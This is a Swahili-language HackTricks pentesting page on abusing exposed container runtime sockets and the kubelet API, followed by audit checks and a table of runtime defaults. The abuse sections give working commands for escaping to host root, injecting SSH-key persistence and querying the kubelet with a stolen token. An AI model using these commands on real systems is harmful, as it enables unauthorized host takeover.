# Uwekwaji wa Runtime API na Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Compromise nyingi halisi za container hazianzi kwa namespace escape hata kidogo. Huanzia kwenye upatikanaji wa control plane ya runtime. Ikiwa workload inaweza kuwasiliana na `dockerd`, `containerd`, CRI-O, Podman, au kubelet kupitia Unix socket iliyomountiwa au TCP listener iliyo wazi, attacker anaweza kuomba container mpya yenye privileges bora zaidi, ku-mount filesystem ya host, kujiunga na namespaces za host, au kupata taarifa nyeti za node. Katika hali hizo, runtime API ndiyo security boundary halisi, na ku-compromise API hiyo kwa utendaji ni karibu sawa na ku-compromise host.

Hii ndiyo sababu uwazi wa runtime socket unapaswa kuandikwa kando na protections za kernel. Container yenye seccomp, capabilities, na MAC confinement za kawaida bado inaweza kuwa API call moja tu kutoka kwa host compromise ikiwa `/var/run/docker.sock` au `/run/containerd/containerd.sock` ime-mountiwa ndani yake. Kernel isolation ya container ya sasa inaweza kuwa inafanya kazi jinsi ilivyokusudiwa, huku management plane ya runtime ikiwa bado imewekwa wazi kikamilifu.

## Access Models za Daemon

Docker Engine kwa kawaida huweka API yake yenye privileges kupitia Unix socket ya ndani kwenye `unix:///var/run/docker.sock`. Kihistoria, pia imekuwa ikiwekwa wazi remotely kupitia TCP listeners kama `tcp://0.0.0.0:2375` au listener iliyolindwa na TLS kwenye `2376`. Kuweka daemon wazi remotely bila TLS imara na client authentication kwa ufanisi hubadilisha Docker API kuwa remote root interface.

containerd, CRI-O, Podman, na kubelet huweka wazi attack surfaces zenye impact kubwa kwa njia zinazofanana. Majina na workflows hutofautiana, lakini logic haibadiliki. Ikiwa interface inamruhusu caller kuunda workloads, ku-mount paths za host, kupata credentials, au kubadilisha containers zinazoendelea, interface hiyo ni privileged management channel na inapaswa kushughulikiwa ipasavyo.

Local paths za kawaida zinazostahili kuangaliwa ni:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Stack za zamani au zilizobobea zaidi zinaweza pia kufichua endpoints kama `dockershim.sock`, `frakti.sock`, au `rktlet.sock`. Hizi hazitumiki sana katika mazingira ya kisasa, lakini zinapopatikana zinapaswa kushughulikiwa kwa tahadhari hiyo hiyo kwa sababu zinawakilisha nyuso za udhibiti wa runtime badala ya sockets za kawaida za application.

## Ufikiaji wa Mbali Ulio Salama

Ikiwa daemon lazima ifichuliwe nje ya socket ya ndani, muunganisho unapaswa kulindwa kwa TLS na ikiwezekana utumie mutual authentication ili daemon ithibitishe client na client ithibitishe daemon. Tabia ya zamani ya kufungua Docker daemon kupitia plain HTTP kwa ajili ya urahisi ni mojawapo ya makosa hatari zaidi katika usimamizi wa containers, kwa sababu API surface ina uwezo wa kutosha kuunda containers zenye privileges moja kwa moja.

Muundo wa kihistoria wa configuration ya Docker ulikuwa kama ifuatavyo:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Kwenye hosts zinazotumia systemd, mawasiliano ya daemon yanaweza pia kuonekana kama `fd://`, ikimaanisha kuwa mchakato hurithi socket iliyofunguliwa awali kutoka kwa systemd badala ya kuifungamanisha moja kwa moja. Somo muhimu si sintaksia halisi, bali athari ya kiusalama. Mara daemon inaposikiliza nje ya socket ya ndani yenye ruhusa zilizobana, usalama wa transport na uthibitishaji wa client huwa wa lazima badala ya kuwa hardening ya hiari.

## Abuse

Ikiwa socket ya runtime ipo, thibitisha ni ipi, kama client inayooana ipo, na kama ufikiaji wa raw HTTP au gRPC unawezekana:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Amri hizi ni muhimu kwa sababu zinatofautisha kati ya njia ambayo haipo, socket iliyowekwa lakini haiwezi kufikiwa, na API hai yenye privileged access. Ikiwa client inafanikiwa, swali linalofuata ni kama API inaweza kuzindua container mpya yenye host bind mount au kushiriki host namespace.

### Wakati Hakuna Client Iliyosakinishwa

Kutokuwepo kwa `docker`, `podman`, au CLI nyingine rahisi kutumia hakumaanishi kuwa socket iko salama. Docker Engine huwasiliana kwa HTTP kupitia Unix socket yake, na Podman hutoa API inayooana na Docker pamoja na API ya asili ya Libpod kupitia `podman system service`. Hii inamaanisha kuwa mazingira madogo yenye `curl` pekee bado yanaweza kutosha kuendesha daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Hili ni muhimu wakati wa post-exploitation kwa sababu defenders wakati mwingine huondoa client binaries za kawaida lakini wakaacha management socket ikiwa ime-mountiwa. Kwenye hosts za Podman, kumbuka kwamba path yenye thamani kubwa hutofautiana kati ya deployments za rootful na rootless: `unix:///run/podman/podman.sock` kwa rootful service instances na `unix://$XDG_RUNTIME_DIR/podman/podman.sock` kwa rootless.

### Mfano Kamili: Docker Socket Kwenda kwenye Host Root

Ikiwa `docker.sock` inaweza kufikiwa, escape ya kawaida ni kuanzisha container mpya inayomount host root filesystem, kisha kufanya `chroot` ndani yake:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Hii hutoa utekelezaji wa moja kwa moja wa host-root kupitia Docker daemon. Athari si za kusoma faili pekee. Akiwa ndani ya container mpya, mshambuliaji anaweza kubadilisha faili za host, kukusanya credentials, kuweka persistence, au kuanzisha workloads nyingine zenye privileges.

### Mfano Kamili: Docker Socket Hadi Host Namespaces

Ikiwa mshambuliaji anapendelea namespace entry badala ya access ya filesystem pekee:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Njia hii hufikia host kwa kuomba runtime iunde container mpya yenye host-namespace exposure iliyoainishwa wazi, badala ya kutumia vibaya ile iliyopo.

### Docker Socket Persistence Pattern

Runtime control pia inaweza kutumika kwa persistence badala ya one-shot shell. Muundo wa jumla ni kuunda helper container yenye host mount, kuandika authorized access material au startup hook kwenye host filesystem iliyomountiwa, kisha kuthibitisha kwamba host inaitumia.

Muundo wa mfano:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
Wazo hilo hilo linaweza kulenga systemd units, cron fragments, application startup files, au SSH keys kulingana na kile operator anachotaka kuthibitisha. Jambo muhimu ni kwamba mabadiliko ya kudumu hufanywa kupitia mamlaka ya filesystem ya kiwango cha host ya runtime daemon, si kupitia privilege ya ziada ndani ya container ya awali.

### Raw Docker API Helper Pivot

Docker CLI inapokosekana, mtiririko huo huo wa host-mount helper unaweza kuendeshwa kupitia HTTP kwenye Unix socket. Mtiririko wa jumla ni: thibitisha API, tengeneza helper container yenye host bind mount, ianzishe, tengeneza exec instance, kisha uanzishe exec hiyo.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
Ombi la mwisho la `/exec/<id>/start` linategemea exec ID iliyorudishwa, lakini hoja ya usalama haitegemei mpangilio kamili wa JSON: ufikiaji wa moja kwa moja wa API kwa Docker daemon ya rootful unatosha kuomba workload msaidizi yenye uwezo zaidi.

### Mfano Kamili: containerd Socket

Socket ya `containerd` iliyomountiwa kwa kawaida huwa hatari vilevile:<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Ikiwa client inayofanana zaidi na Docker ipo, `nerdctl` inaweza kuwa rahisi zaidi kuliko `ctr` kwa sababu inaonyesha flags zinazojulikana kama `--privileged`, `--pid=host`, na `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Athari bado ni compromise ya host. Hata kama tooling maalum ya Docker haipo, runtime API nyingine bado inaweza kutoa uwezo huo huo wa kiutawala. Kwenye Kubernetes nodes, `crictl` inaweza pia kutosha kwa reconnaissance na interaction na containers kwa sababu inawasiliana moja kwa moja na CRI endpoint.

### BuildKit Socket

`buildkitd` ni rahisi kupuuzwa kwa sababu mara nyingi watu huiona kama "build backend tu", lakini daemon bado ni control plane yenye privileged access. `buildkitd.sock` inayoweza kufikiwa inaweza kumruhusu attacker kuendesha build steps kiholela, kukagua uwezo wa workers, kutumia local contexts kutoka kwenye mazingira yaliyo-compromise, na kuomba entitlements hatari kama `network.host` au `security.insecure` wakati daemon imesanidiwa kuziruhusu.

Mwingiliano wa kwanza unaofaa ni:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Ikiwa daemon inakubali build requests, test kama insecure entitlements zinapatikana:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Athari halisi hutegemea usanidi wa daemon, lakini huduma ya rootful BuildKit yenye entitlements zinazoruhusu mambo mengi si urahisishaji usio na madhara kwa developer. Ichukulie kama eneo jingine lenye thamani kubwa la kiutawala, hasa kwenye CI runners na build nodes zinazoshirikiwa.

### Kubelet API kupitia TCP

Kubelet si container runtime, lakini bado ni sehemu ya safu ya usimamizi wa node na mara nyingi huhusika katika mjadala uleule wa trust boundary. Ikiwa secure port ya kubelet `10250` inafikika kutoka kwenye workload, au ikiwa node credentials, kubeconfigs, au proxy rights zimefichuka, mshambulizi anaweza kuorodhesha Pods, kupata logs, au kutekeleza commands kwenye containers zilizo ndani ya node bila hata kugusa njia ya admission ya Kubernetes API server.

Anza na ugunduzi wa awali wa gharama ndogo:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Ikiwa kubelet au njia ya proxy ya API-server inaidhinisha `exec`, client inayoweza kutumia WebSocket inaweza kubadilisha hilo kuwa code execution katika containers nyingine kwenye node. Hii pia ndiyo sababu `nodes/proxy` yenye ruhusa ya `get` pekee ni hatari zaidi kuliko inavyoonekana: ombi bado linaweza kufikia endpoints za kubelet zinazotekeleza commands, na maingiliano hayo ya moja kwa moja na kubelet hayaonekani katika audit logs za kawaida za Kubernetes.<sup>[[2]](#references)</sup>

## Ukaguzi

Lengo la ukaguzi huu ni kujibu ikiwa container inaweza kufikia management plane yoyote ambayo ilipaswa kubaki nje ya trust boundary.
```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Kinachovutia hapa:

- Socket ya runtime iliyomountiwa kwa kawaida ni primitive ya moja kwa moja ya kiutawala badala ya kuwa ufichuaji wa taarifa pekee.
- TCP listener kwenye `2375` bila TLS inapaswa kuchukuliwa kuwa hali ya remote-compromise.
- Environment variables kama `DOCKER_HOST` mara nyingi hufichua kwamba workload iliundwa kwa makusudi kuwasiliana na host runtime.

## Chaguomsingi za Runtime

| Runtime / platform | Hali ya chaguomsingi | Tabia ya chaguomsingi | Kudhoofisha kwa mikono kunakotokea mara kwa mara |
| --- | --- | --- | --- |
| Docker Engine | Unix socket ya ndani kwa chaguomsingi | `dockerd` husikiliza kwenye socket ya ndani na daemon kwa kawaida huwa rootful | kumount `/var/run/docker.sock`, kufichua `tcp://...:2375`, TLS dhaifu au usiokuwepo kwenye `2376` |
| Podman | CLI isiyo na daemon kwa chaguomsingi | Hakuna daemon ya privileged inayodumu inayohitajika kwa matumizi ya kawaida ya ndani; API sockets bado zinaweza kufichuliwa wakati `podman system service` imewezeshwa | kufichua `podman.sock`, kuendesha service kwa upana, kutumia rootful API |
| containerd | Socket ya ndani ya privileged | Administrative API hufichuliwa kupitia socket ya ndani na kwa kawaida hutumiwa na tooling ya kiwango cha juu | kumount `containerd.sock`, kutoa ufikiaji mpana wa `ctr` au `nerdctl`, kufichua privileged namespaces |
| CRI-O | Socket ya ndani ya privileged | CRI endpoint inalenga vipengele vinavyoaminika vya node-local | kumount `crio.sock`, kufichua CRI endpoint kwa workloads zisizoaminika |
| Kubernetes kubelet | Node-local management API | Kubelet haipaswi kufikika kwa upana kutoka kwa Pods; ufikiaji unaweza kufichua hali ya pod, credentials, na vipengele vya execution kulingana na authn/authz | kumount kubelet sockets au certs, kubelet auth dhaifu, host networking pamoja na kubelet endpoint inayofikika |

## References

- [1] [unyonyaji wa containerd socket, sehemu ya 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Hatari za Kubernetes API Server Bypass](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
